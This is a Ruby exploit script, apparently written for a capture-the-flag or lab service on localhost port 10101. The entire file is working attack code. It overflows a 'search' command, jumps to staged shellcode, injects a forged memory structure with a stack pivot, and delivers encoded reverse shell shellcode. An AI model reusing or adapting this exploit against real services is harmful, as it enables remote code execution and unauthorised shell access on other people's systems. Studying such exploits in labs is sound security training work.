require 'socket'

class TCPSocket
  def write(msg)
    super(msg)
    flush
  end
end

class Exploit

  def wpipe(size)
    "1\xC0\x89\xC2\x89\xC3\xB0\x03\xB90\xC9\x04\b\xB3\x04f\xBA#{[size].pack('s')}\xCD\x80\x89\xC21\xC0\x89\xC3\xB0\x04\xB90\xC9\x04\b\xB3\a\xCD\x80"
  end

  def initialize
    @s = TCPSocket.new('localhost', 10101)

    7.times { puts @s.readline }

    @jmp_esp = 0x804aacb
    @read_shellcode = "1\xC0\x89\xC2\x89\xC3\xB0\x03\xB90\xC3\x04\b\xB3\x04f\xBA\xFF\x03\xCD\x80\xB80\xC3\x04\b\xFF\xE0"
#    @wpipe = "1\xC0\x89\xC2\x89\xC3\xB0\x03\xB90\xC9\x04\b\xB3\x04f\xBA\xFF\x03\xCD\x80\x89\xC21\xC0\x89\xC3\xB0\x04\xB90\xC9\x04\b\xB3\a\xCD\x80"
    @rpipe = "1\xC0\x89\xC2\x89\xC3\xB0\x03\xB90\xC9\x04\b\xB3\x04f\xBA\xFF\x03\xCD\x80\x89\xC21\xC0\x89\xC3\xB0\x04\xB90\xC9\x04\b\xB3\a\xCD\x80"
    @search_term = 0x0804C0E0
    @pivot = 0x08049798
    @ret = 0x080497A2

    @reverse_shellcode =
      "\xd9\xc9\xb8\x63\xe2\x5c\xaf\xd9\x74\x24\xf4\x5a\x33\xc9" +
      "\xb1\x12\x31\x42\x17\x03\x42\x17\x83\x89\x1e\xbe\x5a\x7c" +
      "\x04\xc8\x46\x2d\xf9\x64\xe3\xd3\x74\x6b\x43\xb5\x4b\xec" +
      "\x37\x60\xe4\xd2\xfa\x12\x4d\x54\xfc\x7a\x31\xa6\xfe\x7b" +
      "\xa5\xa4\xfe\x6a\x69\x20\x1f\x3c\xf7\x62\xb1\x6f\x4b\x81" +
      "\xb8\x6e\x66\x06\xe8\x18\x56\x28\x7e\xb0\xc0\x19\xe2\x29" +
      "\x7f\xef\x01\xfb\x2c\x66\x24\x4b\xd9\xb5\x27"

    @db = [0xb77a4260, 0x00000002, 0x087ec1cc, 0x48100800, 0x00000006, 0x00000000, 0x000000ff, 0x00000001,
      0x000000ff, 0x00000000, 0x00000000, 0x087ec258, 0x00000000, 0x00000000, 0xa029a697, 0x00000000,
      0x00000000, 0x087ec330, 0x3b9aca00, 0x3b9aca00, 0x000007d0, 0x000003e8, 0x000001f4, 0x000061a8,
      0x0000007f, 0x0000000a, 0x0000c350, 0x000003e7, 0x000003e8, 0x00000000, 0x00000000, 0x00000000,
      0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
      0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
      0xb7786de0, 0x000003e8, 0x00000000, 0x00000000, 0x00000000, 0x087ec2d8, 0x00000000, 0x00000000,
      0x00000000, 0x00000000, 0x01010080, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
      0x087fcb98, 0x087ed218, 0x087fcc18, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
      0x00000000, 0x00000005, 0x087ed1f0, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
      0x00000000, 0x087ec790, 0x00000000, 0x087ecf90, 0x087ed010, 0x00000000, 0x00000000, 0x087ec8b0,
      0x087ed0f0, 0x087ed130, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
      0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x087ec608, 0x00000000,
      0x00000003, 0x087ec3e8, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0xb7789305,
      0x087ec428, 0x00000300, 0x087ec538, 0xb7787c8a, 0x00000000, 0x00000100, 0x087ec5a0, 0x00000000,
      0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
      0x00000000, 0x00000000, 0x00000000]

    @db[@db.index(0x087ec1cc)] = 0x804c330
    @db[@db.index(0x087ec330)] = 0x08049F27
    @db[1] = 0x80000002
    @db[0x1f4/4] = 0x804c530
    @db[312 / 4] = 1
    @db[308 / 4] = @search_term
    @db[0] = @search_term
    @db[0x3c / 4] = 0x08049F38

    @db = [0x41414141,@pivot] + @db
    @db = @db + [@ret] * 200 + [@jmp_esp]
    @db = @db.pack('I*')
    @db += "\x83\xc4\x7f" * 2 + @reverse_shellcode
 end

  def trigger
    print @s.read(2)
    payload = "a"*115 + [@jmp_esp].pack('I*') + @read_shellcode
    payload = payload.ljust(0x81, "c")
    @s.write("search " + payload + "\n")

    payload = [close_db, prep(@db), close_db]

    pipe = payload.map {|v| wpipe(v.length) }.join + "\xeb\xfe" # infinite loop

    @s.write(pipe.ljust(0x3ff, "0"))
    payload.each {|p| @s.write(p) }
  end

  def prep(msg)
    [1, msg.length].pack('I*') + msg
  end

  def close_db
    [4, 0].pack('I*')
  end
end

s = Exploit.new
readline
s.trigger
readline
